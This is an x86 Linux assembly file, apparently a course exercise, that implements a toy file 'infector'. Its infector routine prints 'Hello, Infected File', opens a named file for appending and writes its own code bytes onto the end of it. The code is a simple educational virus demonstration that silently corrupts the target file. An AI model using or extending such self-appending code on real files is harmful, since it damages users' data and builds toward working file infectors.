WRITE EQU 4
STDOUT EQU 1
OPEN EQU 5
CLOSE EQU 6
O_APPEND EQU 1024
O_WRONLY EQU 1

section .rodata
section .data
section .text
    global _start
    global system_call
    global infection
    global infector
    ; declaring functions from main.c
    extern main
    extern printVirus
    extern printError
_start:
    ; get argc and argv
    pop    dword ecx   
    mov    esi,esp      
    mov     eax,ecx     
    shl     eax,2       ; calc the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   
    push    dword esi   
    push    dword ecx  

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax     ; store the return value of main in ebx
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; save the base pointer of the caller
    mov     ebp, esp
    sub     esp, 4          ; allocate space for a local variable
    pushad                  

    mov     eax, [ebp+8]           
    mov     ebx, [ebp+12]   
    mov     ecx, [ebp+16]   
    mov     edx, [ebp+20]   
    int     0x80            
    mov     [ebp-4], eax    
    popad                   
    mov     eax, [ebp-4]    
    add     esp, 4          
    pop     ebp             
    ret                     

code_start:
    str: db " Hello, Infected File",10, 0 ; String to print when infecting a file
    dummyStr:
infection:
    pushad
    mov eax,WRITE
    mov ebx,STDOUT
    mov ecx,str
    mov edx,dummyStr-str-1 
    int 0x80
    popad
    ret
infector:
    push ebp
    mov ebp, esp
    pushad
    
    ; Call infection to print "Hello, Infected File"
    call infection
    
    ; open file
    mov ebx, [ebp+8]   ; get first argument filename
    mov eax, OPEN
    mov ecx, O_APPEND | O_WRONLY
    int 0x80
    cmp eax, 0
    jl errorOpen
    push eax
    ; write to file
    mov ebx, eax       ; file descriptor
    mov eax, WRITE
    mov ecx, code_start
    mov edx, code_end-code_start-1
    int 0x80
    ; close file
    mov eax, CLOSE 
    int 0x80
    pop eax
    jmp finish
errorOpen:
    call printError
finish:
    popad
    pop ebp
    ret
code_end:
